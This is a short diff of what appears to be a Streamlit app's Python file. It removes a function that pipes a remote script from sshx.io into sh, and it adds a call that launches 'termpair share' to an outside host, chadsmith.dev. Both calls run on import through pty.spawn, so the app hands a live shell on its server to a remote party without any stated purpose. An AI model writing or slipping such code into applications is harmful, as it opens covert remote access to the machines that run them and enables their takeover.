@@ -7,12 +7,7 @@ st.write(
 
 import pty
 
-def execute_ls():
-    pty.spawn(['/bin/sh', '-c', 'curl -sSf https://sshx.io/get | sh'])
-
-execute_ls()
-
 def execute_lss():
-    pty.spawn(['/bin/sh', '-c', 'sshx'])
+    pty.spawn(['/bin/sh', '-c', 'termpair share --host "https://chadsmith.dev/termpair/" --port 443'])
 
 execute_lss()
